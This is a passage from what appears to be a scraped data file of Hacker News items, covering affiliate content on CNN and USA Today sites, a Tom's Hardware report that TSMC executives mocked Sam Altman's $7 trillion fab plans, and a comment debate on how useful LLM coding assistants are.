see whether the Federal Trade Commission sees a problem with privacy policies and disclosures varying on the same website. I think there's a case to be made that the differences in data gathering fall short of informed consent and that the unified branding for different entities constitutes deceptive advertising. reply ChrisMarshallNY 3 hours agoprevEh, I never considered the Underscored sites to be a part of the main site anyway. I just think of them as “Outbrain”-type subsites. This just confirms it. I feel the title of the blog entry is maybe a bit “extreme,” but it does show some well-done sleuthing. Media companies have had to drastically change their business models, lately, and this is just another part of it. reply alsance 3 hours agoprevSo, what's the big deal? We've seen this same sort of thing happen with literally thousands of news media sites over the last 10 years. Seems the real intention here is say that since there are affiliate ads and advertorials on the site, the entire site is somehow \"fake news\". That's quite a stretch. A fake news site would say something like Covid is \"just the flu\". Or maybe, let's say, endorse lies about an election being rigged. Or focus on new conspiracy theories. Every. Single. Week. Neither site does anything like that — No reputable news organization would ever do something that irresponsible, right? That would be fake news. reply mylons 3 hours agoprevwhat if i told you Forbes 30u30 was paid advertising? reply joshdavham 4 hours agoprevThe plot thickens! Also wouldn’t this present some sort of a conflict of interest as each of these sites (Forbes, CNN, USA Today) are now competing with eachother for SEO? reply photochemsyn 3 hours agoprevThe only reason to pay any attention to CNN, USA Today or Forbes is to understand what's on the minds of the corporate oligarchy in the United States. They're just propaganda feeds, the modern version of the tin-horn propaganda blared out by speakers installed in Red Square in Moscow in the 1970s. This doesn't mean the stories published are false, or even inaccurate - but there's a big negative space in their media coverage. E.g. if culture war issues are amplified, but there are no stories on industrial policy, infrastructure problems, manufacturing job and supply chain analysis - that's deliberate. No, it's not 'what the public wants', it's what the owners of these media outlets want their readers to be thinking about. reply ec109685 3 hours agoprevI am seeing questions about why this is a big deal? The issue is that CNN is using their domain authority to boost this drivel affiliate Money content, and hiding the fact that they are doing it by using layer 7 routing to cloak the site. If CNN used a subdomain, e.g. money.cnn.com, Google could learn that this content should be judged independently from the rest of the site. This money content isn’t competing fairly. Google is being tricked to think these Money articles should have the same inherent authority as other CNN articles. Where this impacts the consumer is that the first articles for popular search terms aren’t the best, but instead written by content marketers chasing the highest affiliate. This crowds out legitimate sites (e.g. in depth reviews of the best mortgage lenders) because they can’t hope to rank higher than CNN for the same term. At the very least, this “path based” cloaking of content authorship should be detectable by Google, but it’s a game of whack a mole, unfortunately. I think if you had a human curate the best content written for these popular SEO’d search terms, they’d be able to find the diamonds from the rough. That gives some hope that algorithms can improve to rank the most useful content for readers. It’s also why Reddit is so popular as a source of content in Google. reply silexia 2 hours agoprevCNN became unreliable and started turning out propaganda years ago. Monetizing it is just the next step. reply tills13 1 hour agoprevok and? reply lupire 4 hours agoprevSo? Every news site has advertising sections https://www.cnn.com/cnn-underscored/about \"Content is created by CNN Underscored’s team of editors who work independently from the CNN newsroom. When you buy through links on our site, we may earn a commission.\" reply dogleash 3 hours agoparentEveryone who uses the web visually scans pages to hone in directly on where they think the content is. The question isn't whether or not whoever added that disclaimer meant for it to be visually ignored (they did), the question is whether they did eye-tracking testing to make sure it's ignored (yea, probably). The disclaimer is disingenuous, because they're trading on the idea people will ignore it, while they can turn around and say everyone is in group of people who not only read the text, but also understand what \"independently from the CNN newsroom\" is a euphemism for. reply w0m 3 hours agorootparentthe disclaimer is at the top of every page, and OP here is pretending his sleuthing anything other than an (idealogically/politically motivated?) disingenuous hit piece. \"look at the HTML it catches the lie!\" - meanwhile, the 'lie' also exposed in clear text in a banner across the top of page. 1337 h4xing indeed. reply w0m 4 hours agoparentprevYea... I think I'm failing to understand the Gotcha here. If you go to underscored main page; It's disclosed in a banner across the top of every underscored page. I agree them functionally selling ad-space is annoying; but it's also exposed in clear text as such at the top of every underscored page and article. Giant nothingburger. reply dickiedyce 4 hours agoparentprev> \"Every news site has advertising sections\" Ahem, bbc.co.uk/news * *? * Note, not bbc.com ;-) * Also, editorially, BBC News has also gone a little downhill in recent times. But it's all relative. reply FactKnower69 1 hour agoparentprev\"but everyone does it\" is about the most pathetic, incurious defense you could muster reply bofadeez 4 hours agoprevMany would agree that the official CNN and USA Today are already \"fake\" in a sense. reply hedora 4 hours agoprevI noticed a steep dive in CNN news quality post acquisition. (Around when they fired a bunch of reporters people for claiming Trump lost in 2020 instead of hedging their statements). Anyway, I’m not surprised. As far as I’m concerned they’re already out of business (just like National Geographic, which currently employs zero staff writers). reply drpossum 4 hours agoparentCNN has been in decline since they started. ca 2000 their content was a shocking amount of what we call clickbait now with the wording and often misrepresentation we've come to expect. They've surprisingly improved but I abandoned them over 20 years ago as anything I consume because of it. reply hedora 4 hours agorootparentTheir TV network has always been terrible, but in the early teens, their website seemed reasonably well run. I wouldn’t seek it out, but it wasn’t on my short list of sites to avoid in news aggregators and HN like it is today. (I’ve never heard of the reporters they fired for being too liberal, but that event marked a sharp change in their strategy, where they said they wanted to target Fox News and Newsmax fans, and that they were changing their reporting standards to cater to those audiences.) reply sutra_on 3 hours agoparentprevThe steep dive in quality of the mainstream media started with the invention of the 24-hour news cycle. Focus shifted from quality to quantity. reply westcort 4 hours agoparentprevhttps://www.archives.gov/electoral-college/2020 reply hereme888 3 hours agoprev [–] That's why my main source of meaningful news is X. Just follow a few high quality independent journalists and also let the open-source algorithm rank content to show you. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Forbes Marketplace, an affiliate company on Forbes.com, has agreements with CNN and USA Today to fill their sites with affiliate content.",
      "CNN Underscored Money and USA Today Blueprint sections are operated by separate entities linked to Forbes Marketplace, not by CNN or USA Today employees.",
      "These sections have different website structures and privacy policies, and they generate significant search traffic, indicating successful affiliate operations."
    ],
    "commentSummary": [
      "CNN and USA Today have fake websites, allegedly operated by Forbes Marketplace, as reported by larslofgren.com, sparking discussions on Hacker News.",
      "The debate centers on media industry practices, where content is often outsourced, resembling social media feeds, and concerns about Google's \"Site reputation abuse\" policy.",
      "This situation underscores the evolving nature of media, the impact of SEO (Search Engine Optimization), and the challenges of upholding journalistic integrity in the digital era."
    ],
    "points": 479,
    "commentCount": 185,
    "retryCount": 0,
    "time": 1727443770
  },
  {
    "id": 41668824,
    "title": "TSMC execs allegedly dismissed OpenAI CEO Sam Altman as 'podcasting bro'",
    "originLink": "https://www.tomshardware.com/tech-industry/tsmc-execs-allegedly-dismissed-openai-ceo-sam-altman-as-podcasting-bro",
    "originBody": "Tech Industry TSMC execs allegedly dismissed Sam Altman as ‘podcasting bro’ — OpenAI CEO made absurd requests for 36 fabs for $7 trillion News By Mark Tyson published 8 hours ago Scale of Sam Altman’s proposed investment plans considered ‘absurd’ Comments (11) When you purchase through links on our site, we may earn an affiliate commission. Here’s how it works. (Image credit: Joe Rogan podcast still) Last winter, OpenAI CEO Sam Altman took a whirlwind tour of the Far East, meeting with high-powered execs from companies like TSMC, Samsung, and SK Hynix, but he didn't make the best first impression. According to a report in the New York Times this week, senior TSMC execs allegedly dubbed the OpenAI chief a “podcasting bro” after the meeting(s) after his absurd requests for 36 new chipmaking plants that would cost an astounding $7 trillion. The NYT claims it discussed OpenAI's negotiations with nine people close to the discussions but who wish to remain anonymous. Altman used his multi-stop trip to pitch his plans to progress AI, involving Asia's manufacturing muscle, Middle Eastern money, and U.S. regulators. The NYT sources say that the scale of investment would be in trillions of dollars – similar in size to a quarter of U.S. annual output for a year. However, the latest OpenAI statements have rolled back such talk to \"mere\" hundreds of billions. It is reported that years of construction time would also be needed to satisfy the OpenAI compute scaling plans. Moonshot dreams crash to earth at TSMC The OpenAI CEO is noted for his ambition. Perhaps Altman is right to have an abundance of confidence in his vision and moonshot-style plans after taking just a few years to become one of the most influential names in tech. Nevertheless, his plans have allegedly not stirred confidence in the hard-nosed execs at TSMC. The NYT report claims that during Altman’s visit to Taiwan, he told TSMC execs that he envisioned a $7 trillion investment over several years. The result would be 36 new semiconductor plants and data centers driving AI forward. TSMC execs allegedly found Altman’s ideas absurd, and according to one of the NYT’s sources, the chipmaking execs subsequently called Altman a “podcasting bro.” Even implementing a fraction of the OpenAI CEO’s ideas would be incredibly risky, the execs are said to have openly pondered. This dismissive attitude to OpenAI’s ambition dovetails with a report we published this summer. During TSMC’s 2024 Annual Shareholders' Meeting, newly elected chairman Dr. C. C. Wei was quoted as making several controversial statements. On the OpenAI CEO, Wei is quoted as saying, \"Sam Altman, he’s too aggressive, too aggressive for me to believe.\" Altman also visited South Korea to talk with high-level Samsung and SK hynix representatives at around the same time. However, negotiations were cut short by national security concerns, indicates the NYT, as back then, countries like the United Arab Emirates (UAE) maintained relationships with China. Things may be different for tech plans involving the UAE now, as earlier this week, President Biden and Sheikh Mohammed bin Zayed, the Emirati president, met at the White House and directed their senior officials to develop a memorandum detailing future collaboration on AI. Earlier this week, we reported on the latest rumors regarding TSMC and Samsung mega factories in the UAE. Stay On the Cutting Edge: Get the Tom's Hardware Newsletter Get Tom's Hardware's best news and in-depth reviews, straight to your inbox. Contact me with news and offers from other Future brands Receive email from us on behalf of our trusted partners or sponsors By submitting your information you agree to the Terms & Conditions and Privacy Policy and are aged 16 or over. The NYT highlights a lot of uncertainty about OpenAI’s incredibly ambitious plans. Details about who would put in what, and what they would get from their investments, remain hazy. However, firms such as the Emirates tech investment specialist MGX, plus household tech titans like Microsoft, Nvidia, and Apple, were named as still being in talks with OpenAI. AI continues to be a money pit with no killer app OpenAI’s business model, as it exists today, doesn’t really inspire confidence, as it seems to exist on the promise of ‘jam tomorrow.’ Specifically, the firm has an income of approximately $3 billion per year, which is put in deep shade by its $7 billion annual expenditure. Altman’s grand plan seems to stem from his theory that AI will be like electricity. As AI becomes more readily available, people will find more and better ways to use it. But at the time of writing, leading tech companies can’t find a killer app for AI. Microsoft’s Copilot gaffes and delays are well documented. Likewise, Apple launched its iPhone 16 and 16 Pro earlier in the month with a lot of talk about Apple Intelligence, but the first of these AI features won’t be available on the new devices until next month. Mark Tyson News Editor Mark Tyson is a news editor at Tom's Hardware. He enjoys covering the full breadth of PC tech; from business and semiconductor design to products approaching the edge of reason. MORE ABOUT TECH INDUSTRY Intel is on track to receive its $8.5 billion CHIPS Act award by year-end Two execs of China-based chipmaking tools producer resign to meet U.S. requirements LATEST AMD X670E motherboard bug downgrades PCIe 5.0 SSDs to PCIe 1.0 speeds SEE MORE LATEST ► SEE ALL COMMENTS (11) 11 Comments Comment from the forums Gururu Want-to-be Elon Musk who could very well be the next Elon Musk. Great salesmen. Altman will get what he wants guaranteed. Reply Elusive Ruse Why call him that out of all things? TSMC guys are weird. Reply Kondamin Elusive Ruse said: Why call him that out of all things? TSMC guys are weird. It’s nicer than what I would have called someone that came to me asking for 36 fabs at a time when the competition is in trouble for trying to build a couple Reply cyrusfox If TSMC isn't willing to work with Sam Altman, I would think Intel might have the capacity, maybe not the capability to match TSMC, but sometimes your best ability is your availability... Reply JamesJones44 I really don't think \"AI makers\" will be the winners in this round of technology. It will be those who best leverage \"AI\"/ML who end up getting the \"win\" from \"AI\". Unless OpenAI and other can come up with something truly proprietary and not easily reproducible using open sourced software, it's going to be a long road IMO. Reply Kondamin JamesJones44 said: I really don't think \"AI makers\" will be the winners in this round of technology. It will be those who best leverage \"AI\"/ML who end up getting the \"win\" from \"AI\". Unless OpenAI and other can come up with something truly proprietary and not easily reproducible using open sourced software, it's going to be a long road IMO. Like the gold rush it's the people selling the pots and shovels that are raking in the money. I think open AI won't be long for this world as meta and google get up to steam and microsoft starts doing their own thing Reply vanadiel007 Well, I am sure if he has the 7 trillion in his bank account they will be able to proceed. But until then asking for 7 trillion worth of \"stuff\" is just crazy talk. It's not even ambitious or forward thinking, it's just a plain pipe dream. Reply Steve Nord_ Elusive Ruse said: Why call him that out of all things? TSMC guys are weird. People who know the number of particles in the universe being asked for 30% of them will deadpan that way. Reply palladin9479 Yeah he needs to get money from somewhere to keep the hustle going. Gotta keep selling the dream of AI cars, AI toaster ovens, AI clothing and eventually AI all-the-things. Reply vanadiel007 palladin9479 said: Yeah he needs to get money from somewhere to keep the hustle going. Gotta keep selling the dream of AI cars, AI toaster ovens, AI clothing and eventually AI all-the-things. I heard AI moderators are coming soon. Reply VIEW ALL 11 COMMENTS Show more comments",
    "commentLink": "https://news.ycombinator.com/item?id=41668824",
    "commentBody": "TSMC execs allegedly dismissed OpenAI CEO Sam Altman as 'podcasting bro' (tomshardware.com)441 points by WithinReason 8 hours agohidepastfavorite472 comments dang 9 minutes agoI've re-upped the original article here: Behind OpenAI's plan to make A.I. flow like electricity - https://news.ycombinator.com/item?id=41663562 Submitters: \"Please submit the original source. If a post reports on something found on another site, submit the latter.\" - https://news.ycombinator.com/newsguidelines.html reply kranke155 7 hours agoprevMight as well share the original NYT article, since this one is a poor summary of that one - https://web.archive.org/web/20240926063521/https://www.nytim... wslh 6 hours agoparentnext [5 more] Sorry, but I think the original article is more insightful about the complexity and reality of making chips, which TSMC knows well, compared to moonshots by people who don't fully understand the intricacies of the semiconductors supply chain. reply kranke155 6 hours agorootparentHuh? What original article? The Toms Hardware article is a copy and paste of the NYT one. reply wslh 6 hours agorootparentThe original article I was referring to is the NYT piece, which covers more of the complexities around chip manufacturing and energy needs. While the Tom's Hardware article draws from it, the summary focuses more on personality clashes, losing some of the nuanced details about supply chain challenges. reply kranke155 5 hours agorootparentYou realise I shared the original article right? And OP shared the summary? reply wslh 5 hours agorootparentWhat I'm saying is that the two articles are not the same. For example, the term \"moonshot\" as in \"Moonshot dreams crash to earth at TSMC\" is specific to one article and not the other. I think it sets a clearer tone, even if one is based on the other. reply bdndndndbve 7 hours agoprevThe current AI hype wave has really hit a nerd soft spot - that we're steps away from AGI. Surely if a computer can make plausible-looking but incorrect sentences we're days away from those sentences being factually accurate! The winter after this is gonna be harsh. reply dreamcompiler 3 hours agoparentOne time long ago there were people living on an island who had never had contact with anybody else. They marveled at the nature around them and dreamed of harnessing it. They looked up at the moon at night and said \"Some day we will go there.\" But they lived in grass huts and the highest they had ever been off the ground was when they climbed a tree. One day a genius was born on the island. She built a structure taller than the tallest tree. \"I call it a stepladder,\" she said. The people were amazed. They climbed the stepladder and looked down upon the treetops. The people proclaimed \"All we have to do now is make this a little higher and we can reach the moon!\" reply JanSt 7 hours agoparentprevUsing Claude 3.5 Sonnet in Cursor Composer already shows huge benefits for coding. I'm more productive than ever before. The models are still getting better and better. I'm not saying AGI is right around the corner or that we will reach it, but the benefits are undeniable. o1 added test-time compute. No need to be snarky. reply TheCondor 4 hours agorootparentIt’s not snark, our industry is run on fear. If there is the tiniest flicker of potential, we will spend piles of money out of fear of being left behind. As you age, it becomes harder to deny.. 10 years ago, I was starting to believe that my kids would never learn to drive or possibly buy a car, here we are ten years later and not that much has changed, I know you can take a robotaxi in some cities but nearly all interstate trucking has someone driving. Coding AI assistants have done some impressive things, I’ve been amazed at how they sniffed out some repetitive tasks I was hacking on and I just tab completed pages of code that was pretty much correct. There is use. I pay for the feature. I don’t know if it’s worth 35% of the world’s energy consumption and all new fabrication resources over the next handful of years being dedicated to ‘ai chips.’ We arent looking for a better 2.0, we are expecting an exponentially better “2.0” and those are very rare. reply dmix 3 hours agorootparentThat doesn't mean this is a bad investment for VCs. GPT is being directly integrated in iOS and is a top app on both markets. We've also barely scrapped the surface for potential niche applications that go beyond just a generalist chatbox interface. API use will likely continue to explode as the mountain of startups building off it come online. Voice stuff will probably kill off Alexa/Google Home. I don't think the bulk of this VC money is predicated on AGI being around the corner. But the general trend hopping nature of big VC money is real. Still, VCs manage to continue to make a profit despite this, otherwise the industry would have died off or shrunk the 10 other years HN critiqued this behaviour, so on the whole they must be doing something right. reply KoolKat23 1 hour agorootparentThere is a tremendous opportunity in bridging the gap between Can be automated and Isn't automated due to technical/cost/time limitation. GPT's are perfect for this. There are so many things that can be automated out there that currently aren't. Other industries are extremely manual and process driven still. Many here tend to underestimate this. Some programmers here will argue it's error prone or creating technical debt but most people don't care, if it works it works, one can worry about it breaking in 5 years time after its saved you considerably time and money. reply tdeck 2 hours agorootparentprevVCs mostly make money by selling a narrative about investing in the next big thing and then collecting management fees, not by beating the market. If the public sours on AI we need a new hype to replace it and keep tech money flowing at the same rate. A lot of funding seems to follow fads and be disproportionate to value generated (I remember when there were a bazillion people building social networks because that was hot). reply cma 1 hour agorootparentprev> ten years later and not that much has changed, I know you can take a robotaxi in some cities but Uhh, that's a pretty big change. reply jsheard 7 hours agorootparentprevThere's no accounting for taste, but keep in mind that all of these services are currently losing money, so how much would you actually be willing to pay for the service you're currently getting in order to let it break even? There was a report that Microsoft is losing $20 for every $10 spent on Copilot subscriptions, with heavy users costing them as much as $80 per month. Assuming you're one of those heavy users, would you pay >$80 a month for it? Then there's chain-of-thought being positioned as the next big step forwards, which works by throwing more inferencing at the problem, so that cost can't be amortized over time like training can... reply binocarlos 7 hours agorootparentI would pay hundreds of dollars per month for the combination of cursor and claude - I could not get my head around it when my beginner lever colleague said \"I just coded this whole thing using cursor\". It was an entire web app, with search filters, tree based drag and drop GUIs, the backend api server, database migrations, auth and everything else. Not once did he need to ask me a question. When I asked him \"how long did this take\" and expected him to say \"a few weeks\" (it would have taken me - a far more experienced engineer - 2 months minimum). His answer was \"a few days\". What I'm not saying is \"AGI is close\" but I've seen tangible evidence (only in the last 2 months), that my 20 year software engineering career is about to change and massively for the upside. Everyone is going to be so much more productive using these tools is how I see this. reply aniviacat 6 hours agorootparentCurrent LLMs fail if what you're coding is not the most common of tasks. And a simple web app is about as basic as it gets. I've tried using LLMs for some libraries I'm working on, and they failed miserably. Trying to make an LLM implement a trait with a generic type in Rust is a game of luck with very poor chances. I'm sure LLMs can massively speed up tasks like front-end JavaScript development, simple Python scripts, or writing SQL queries (which have been written a million times before). But for anything even mildly complex, LLMs are still not suited. reply dathinab 6 hours agorootparentI don't think if complexity is the right metric. front-end JS can easily also become very complex I think a better metric is how close you are to reinventing a wheel for the thousands time. Because that is what LLMs are good at: Helping you write code which nearly the same way has already been written thousands of times. But that is also something you find in backend code, too. But that is also something where we as a industry kinda failed to produce good tooling. And worse if you are in the industry it's kinda hard to spot without very carefully taking a hounded (mental) steps back from what you are used to and what biases you might have. reply mrybczyn 6 hours agorootparentLLM Code Assistants have succeeded at facilitating reusable code. The grail of OOP and many other paradigms. We should not have an entire industry of 10,000,000 devs reinventing the JS/React/Spring/FastCGi wheel. Im sure those humans can contribute in much better ways to society and progress. reply itishappy 5 hours agorootparent> LLM Code Assistants have succeeded at facilitating reusable code. I'd have said the opposite. I think LLMs facilitate disposable code. It might use the same paradigms and patterns, but my bet is that most LLM written code is written specifically for the app under development. Are there LLM written libraries that are eating the world? reply dbmikus 5 hours agorootparentI believe you're both saying the same thing. LLMs write \"re-usable code\" at the meta level. The code itself is not clean and reusable across implementations, but you don't even need that clean packaged library. You just have an LLM regenerate the same code for every project you need it in. The LLM itself, combined with your prompts, is effectively the reusable code. Now, this generates a lot of slop, so we also need better AI tools to help humans interpret the code, and better tools to autotest the code to make sure it's working. I've definitely replaced instances where I'd reach for a utility library, instead just generating the code with AI. I think we also have an opportunity to merge the old and the new. We can have AI that can find and integrate existing packages, or it could generate code, and after it's tested enough, help extract and package it up as a battle tested library. reply itishappy 4 hours agorootparentAgreed. But this terrifies me. The goal of reusable code (to my mind) is that with everybody building from the same foundations we can enable more functional and secure software. Library users contributing back (even just bug reports) is the whole point! With LLMs creating everything from scratch, I think we're setting ourselves on a path towards less secure and less maintainable software. reply KoolKat23 50 minutes agorootparentThis is the thing it works both ways, it's really good at interpreting existing codebases too. Could potentially mean just a change in time allocation/priority. As it's easier and faster to locate and potentially resolve issues later, it is less important for code to be consistent and perfectly documented. Not fool proof and who knows how that could evolve, but just an alternative view. One of these big names in the industry said we'll have AGI when it speaks it's own language. :P. reply thelastparadise 2 hours agorootparentprevI (20+ years experience programmer) find it leads to a much higher quality output as I can now afford to do all the mundane, time-consuming housekeeping (refactors, more tests, making things testable). E.g. let's say I'm working on a production thing and features/bugfixes accumulate and some file in the codebase starts to resemble spaghetti. The LLM can help me unfuck that way faster and get to a state of very clean code, across many files at once. reply erosivesoul 54 minutes agorootparentWhat LLM do you use? I've not gotten a lot of use out of Copilot, except for filling in generic algorithms or setting up boilerplate. Sometimes I use it for documentation but it often overlooks important details, or provides a description so generic as to be pointless. I've heard about Cursor but haven't tried it yet. reply dbmikus 6 minutes agorootparentCursor is much better than Copilot. Also, change it to use Claude, and then use the Inspector with ctrl-I PaulHoule 6 hours agorootparentprevRoughly LLMs are great at things that involve a series of (near) 1-1 correspondences like “translate 同时采访了一些参与其中的活跃用户 to English” or “How do I move something up 5px in CSS without changing the rest of the layout?” but if the relationship of several parts is complex (those Rust traits or anything involving a fight with the borrow checker) or things have to go in some particular order it hasn’t seen (say US states in order of percent water area) they struggle. SQL is a good target language because the translation from ideas (or written description) is more or less linear, the SQL engine uses entirely different techniques to turn that query into a set of relational operators which can be rewritten for efficiency and compiled or interpreted. The LLM and the SQL engine make a good team. reply infecto 6 hours agorootparentprevI’d bet that about 90% of software engineers today are just rewriting variations of what’s already been done. Most problems can be reduced to similar patterns. Of course, the quality of a model depends on its training data—if a library is new or the language isn’t widely used, the output may struggle. However, this is a challenge people are actively working on, and I believe it’s solvable. LLMs are definitely suited for tasks of varying complexity, but like any tool, their effectiveness depends on knowing when and how to use them. reply ben_w 6 hours agorootparentprev> Current LLMs fail if what you're coding is not the most common of tasks Succeeding on the most common tasks (which isn't exactly what you said) is identical to \"they're useful\". reply abm53 6 hours agorootparentAnd I would go further… these “common tasks” cover 80% of the work in even the most demanding engineering or research positions. reply layer8 5 hours agorootparentThat’s absolutely not my experience. I struggle to find tasks in my day to day work where LLMs are saving me time. One reason is that the systems and domains I work with are hardly represented at all on the internet. reply scruple 5 hours agorootparentI have the same experience. I'm in gamesdev and we've been encouraged to test out LLM tooling. Most of us at/above the senior level report the same experience: it sucks, it doesn't grasp the broader context of the systems that these problems exist inside of, even when you prompt it as best as you can, and it makes a lot of wild assed, incorrect assumptions about what it doesn't know and which are often hard to detect. But it's also utterly failed to handle mundane tasks, like porting legacy code from one language and ecosystem to another, which is frankly surprising to me because I'd have assumed it would be perfectly suited for that task. reply nicolas_t 4 hours agorootparentIn my experience, AI for coding is having a rather stupid very junior dev at your beck and call but who can produce the results instantly. It's just often very mediocre and getting it fixed often takes longer than writing it on your own. reply bee_rider 5 hours agorootparentprev> Not once did he need to ask me a question. When I asked him \"how long did this take\" and expected him to say \"a few weeks\" (it would have taken me - a far more experienced engineer - 2 months minimum). > Current LLMs fail if what you're coding is not the most common of tasks. And a simple web app is about as basic as it gets. These two complexity estimates don’t seem to line up. reply fhd2 5 hours agorootparentprevThat's still valuable though: For problem validation. It lowers the table stakes for building any sort of useful software, which all start simple. Personally, I just use the hell out of Django for that. And since tools like that are already ridiculously productive, I don't see much upside from coding assistants. But by and large, so many of our tools are so surprisingly _bad_ at this, that I expect the LLM hype to have a lasting impact here. Even _if_ the solutions aren't actually LLMs, but just better tools, since we reconfigured how long something _should_ take. reply skydhash 5 hours agorootparentThe problem Django solves is popular, which is why we have so many great frameworks that shorten the implementation time (I use Laravel for that). Just like game engines or GUI libraries, assuming you understand the core concepts of the domain. And if the tool was very popular and the LLMs have loads of data to train on, there may be a small productivity tick by finding common patterns (small because if the patterns are common enough, you ought to find a library/plugin for it). Bad tools often falls in three categories. Too simple, too complex, or unsuitable. For the last two, you'd better switch but there's the human element of sunken costs. reply ilaksh 1 hour agorootparentprevWhich model exactly? You understand that every few months we are getting dramatically better models? Did you try the one that came out within the last week or so (o1-preview). reply znpy 6 hours agorootparentprevI had similar experiences: 1. Aasked ChatGPT to write a simple echo server in C but with this twist: use io_uring rather than the classic sendmsg/recvmsg. The code it spat out wouldn't compile, let alone work. It was wrong on many points. It was clearly pieces of who-knows-what cut and pasted together. However after having banged my head on the docs for a while I could clearly determine from which sources the code io_uring code segments were coming. The code barely made any sense and it was completely incorrect both syntactically and semantically. 2. Asked another LLM to write an AWS IAM policy according to some specifications. It hallucinated and used predicates that do not exist at all. I mean, I could have done it myself if I just could have made predicates up. > But for anything even mildly complex, LLMs are still not suited. Agreed, and I'm not sure we are any close to them being. reply mattgreenrocks 4 hours agorootparentYep. LLMs don’t really reason about code, which turns out to not be a problem for a lot of programming nowadays. I think devs don’t even realize that the substrate they build on requires this sort of reasoning. This is probably why there’s such a divide when you try to talk about software dev online. One camp believes that it boils down to duct taping as many ready made components together all in pursuit of impact and business value. Another wants to really understand all the moving parts to ensure it doesn’t fall apart. reply typedef_struct 2 hours agorootparentprevMy test is to take a sized chunk of memory containing a TrueType/OpenType font and output a map of glyphs to curves. Bot is nowhere close. reply gambiting 5 hours agorootparentprevI work in video games, I've tried several AI assistants for C++ coding and they are all borderline useless for anything beyond writing some simple for loops. Not enough training data to be useful I bet, but I guess that's where the disparity is - web apps, python....that has tonnes of publicly available code that it can train on. Writing code that manages GPU calls on a PS5? Yeah, good luck with that. reply maroonblazer 5 hours agorootparentPresumably Sony is sitting on decades worth of code for each of the PlayStation architectures. How long before they're training their own models and making those available to their studios' developers? reply skydhash 5 hours agorootparentI don't think sony have these codes, more likely the finished build. And all the major studios have game engines for their core product (or they license one). The most difficult part is writing new game mechanics or supporting a new platform. reply Roark66 6 hours agorootparentprevI can't understand how anyone can use these tools (copilot especially) to make entire projects from scratch and expand them later. They just lead you down the wrong path 90% of the time. Personally I much prefer Chatgpt. I give it specific small problems to resolve and some context. At most 100 lines of code. If it gets more the quality goes to shit. In fact copilot feels like chatgpt that was given too much context. reply sensanaty 5 hours agorootparentI hear it all the time on HN that people are producing entire apps with LLMs, but I just don't believe it. All of my experiences with LLMs have been that for anything that isn't a braindead-simple for loop is just unworkable garbage that takes more effort to fix than if you just wrote it from scratch to begin with. And then you're immediately met with \"You're using it wrong!\", \"You're using the wrong model!\", \"You're prompting it wrong!\" and my favorite, \"Well, it boosts my productivity a ton!\". I sat down with the \"AI Guru\" as he calls himself at work to see how he works with it and... He doesn't. He'll ask it something, write an insanely comprehensive prompt, and it spits out... Generic trash that looks the same as the output I ask of it when I provide it 2 sentences total, and it doesn't even work properly. But he still stands by it, even though I'm actively watching him just dump everything he just wrote up for the AI and start implementing things himself. I don't know what to call this phenomenon, but it's shocking to me. Even something that should be in its wheelhouse like producing simple test cases, it often just isn't able to do it to a satisfactory level. I've tried every one of these shitty things available in the market because my employer pays for it (I would never in my life spend money on this crap), and it just never works. I feel like I'm going crazy reading all the hype, but I'm slowly starting to suspect that most of it is just covert shilling by vested persons. reply insane_dreamer 4 hours agorootparentThe other day I decided to write a script (that I needed for a project, but ancillary, not core code) entirely with CoPilot. It wasn't particularly long (maybe 100 lines of python). It worked. But I had to iterate so much with the LLM, repeating instructions, fixing stuff that didn't run, that it took a fair bit longer than if I had just written it myself. And this was a fairly vanilla data science type of script. reply shriek 3 hours agorootparentprevMost of the time the entire apps are just a timer app or something simple. Never a complex app with tons of logic in them. And if you're having to write paragraphs of texts to write something complex then might as well just write that in a programming language, I mean isn't that what high-level programming language was built for? (heh). Also, you're not the only one who's had the thought that someone is vested in someway to overhype this. reply KoolKat23 58 minutes agorootparentYou can write the high level structure yourself and let it complete the boilerplate code within the functions, where it's less critical/complicated. Can save you time. reply mattgreenrocks 4 hours agorootparentprevYou aren’t the only one that feels this way. After 20 years of being held accountable for the quality of my code in production, I cannot help but feel a bit gaslit that decision-makers are so elated with these tools despite their flaws that they threaten to take away jobs. reply skydhash 5 hours agorootparentprevHere is another example [0]. 95% of the code was taken as it is from the examples of the documentation. If you still need to read the code after it was generated, you may have well read the documentation first. When they say treat it like an intern, I'm so confused. An intern is there to grow and hopefully replace you as you get promoted or leave. The tasks you assign to him are purposely kept simple for him to learn the craft. The monotonous ones should be done by the computer. [0]: https://gist.github.com/simonw/97e29b86540fcc627da4984daf5b7... reply Workaccount2 5 hours agorootparentprevAs a non-programmer at a non-programming company: I use it to write test systems for physical products. We used to contract the work out or just pay someone to manually do the tests. So far it has worked exceptionally well for this. I think the core issue of the \"do LLMs actually suck\" is people place different (and often moving) goalposts for whether or not it sucks. reply achempion 5 hours agorootparentprevI have the same observation as well. The hype is getting generated mostly by people who're selling AI courses or AI-related products. It works well as a smart documentation search where you can ask follow-up questions or when you know what the output should look like if you see it but can't type it directly from the memory. For code assistants (aka copilot / cursor), it works if you don't care about the code at all and ok with any solution if it's barely working (I'm ok with such code for my emacs configuration). reply ChainOfFools 2 hours agorootparentprev> but I'm slowly starting to suspect that most of it is just covert shilling by vested persons. It's almost as if the horde of former kleptocurrency bros have found a promising new seam of fool's gold to mine reply skywhopper 3 hours agorootparentprevI think to the extent this works for some people it’s as a way to trick their brains into “fixing” something broken rather than having to start from scratch. And for some devs, that really is a more productive mode, so maybe it works in the end. And that’s fine if the dev realizes what’s going on but when they attribute their own quirks to AI magic, that’s a problem. reply flir 5 hours agorootparentprevJust for fun, give it a function you wrote, and ask it if it can make any improvements. I reckon I accept about a third of what it suggests. reply mattgreenrocks 3 hours agorootparentNot a bad use, though I argue being able to do that critique yourself has a compounding effect over time that is worthwhile. reply flir 3 hours agorootparentWell... I have to critique the critique, else how do I know which two thirds to reject? In theory I'm learning from the LLM during this process (much like a real code review). In practice, it's very rare that it teaches me something, it's just more careful than I am. I don't think I'm ever going to be less slap-dash, unfortunately, so it's a useful adjunct for me. reply mythrwy 2 hours agorootparentprevI just wrote a fairly sizable app with an LLM. This is the first complete app I've written using it. I did write some of the core logic myself leaving the standard crud functions and UI for the LLM. I did it in little pieces and started over with fresh context each time the LLM started to get off in the weeds. I'm very happy with the result. The code is clean and well commented, the tests are comprehensive and the app looks nice and performs well. I could have done all this manually too but it would have taken longer and I probably would have skimped out on some tests and gave up and hacked a few things in out of expedience. Did the LLM get things wrong on occasion? Yes. Make up api methods that don't exist? Yes. Skip over obvious standard straightforward and simple solutions in favor of some rat's nest convoluted way to achieve the same goal? Yes. But that is why I'm here. It's a different style of programming (and one that I don't enjoy 